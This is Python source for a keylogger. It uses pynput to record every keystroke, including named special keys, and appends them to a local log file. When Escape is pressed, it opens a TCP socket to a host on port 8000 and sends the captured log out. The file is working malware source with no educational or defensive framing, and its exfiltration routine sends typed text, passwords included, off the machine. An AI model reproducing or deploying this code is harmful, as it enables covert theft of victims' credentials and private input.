import os
import pynput
from pynput.keyboard import Key, Listener
import datetime
import socket

keys = []

def on_press(key):
    try:
        #print('{0}'.format(key.char))
        keys.append(key.char)
    except AttributeError:
        if key == Key.space:
            keys.append(' ')
  
        elif key == Key.backspace:
            #print("  backspace  ")
            keys.append('  backspace   ')
            #send_keystrokes('  backspace   ')
        elif key == Key.shift:
            #print("shift")
            keys.append('  shift  ')
            #send_keystrokes('  shift  ')
        elif key == Key.alt:
            #print("alt")
            keys.append('  alt  ')
            #send_keystrokes('  alt  ')
        elif key == Key.ctrl:
            #print("ctrl")
            keys.append('  ctrl  ')
            #send_keystrokes('  ctrl  ')
        elif key == Key.caps_lock:
            #print("caps_lock")
            keys.append('  caps_lock  ')
            #send_keystrokes('  caps_lock  ')
        elif key == Key.delete:
            #print("delete")
            keys.append('  delete  ')
            #send_keystrokes('  delete  ')
        elif key == Key.down:
            #print("down")
            keys.append('  down  ')
            #send_keystrokes('  down  ')
        elif key == Key.end:
            #print("end")
            keys.append('  end  ')
            #send_keystrokes('  end  ')
        elif key == Key.enter:
            #print("enter")
            keys.append('  enter  ')
            #send_keystrokes('  enter  ')
        elif key == Key.esc:
            #print("esc")
            keys.append('  esc  ')
            #send_keystrokes('  esc  ')
        elif key == Key.home:
            #print("home")
            keys.append(' home ')
            #send_keystrokes(' home ')
        elif key == Key.insert:
            #print("insert")
            keys.append(' insert ')
            #send_keystrokes(' insert ')
        elif key == Key.left:
            #print("left")
            keys.append(' left ')
            #send_keystrokes(' left ')
        elif key == Key.page_down:
            #print("page_down")
            keys.append(' page_down ')
            #send_keystrokes(' page_down ')
        elif key == Key.page_up:
            #print("page_up")
            keys.append(' page_up ')
            #send_keystrokes(' page_up ')
        elif key == Key.right:
            #print("right")
            keys.append('  right  ')
            #send_keystrokes('  right  ')
        elif key == Key.tab:
            #print("tab")
            keys.append(' tab ')
            #send_keystrokes(' tab ')
        elif key == Key.up:
            #print("up")
            keys.append(' up ')
            #send_keystrokes(' up ')
        else:
            # For numbers and other special characters
            key_value = str(key)[1]
            #print(key_value)
            keys.append(key_value)
            #send_keystrokes(key_value)

def check_file_existence(filename):
    return os.path.exists(filename)

def get_unique_filename(filename):
    filename_base, file_extension = os.path.splitext(filename)
    timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    new_filename = f"{filename_base}_{timestamp}{file_extension}"
    return new_filename
    
def write_file(keys):
    filename = 'keystrokes_log.txt'
    if check_file_existence(filename):
        filename = get_unique_filename(filename)
    with open(filename, 'a') as f: 
        for key in keys:
            f.write(key)
       
        f.write('\n')
    return filename
        

def send_keystrokes1(file_name):
    HOST = '0.0.0.0'
    PORT = 8000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    with open(file_name,'r') as file:
        data=file.read()
        s.send(data.encode()) 
    s.close()
def on_release(key):
    #print('{0} released'.format(key))
    if key == Key.esc:
        send_keystrokes1(write_file(keys))
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
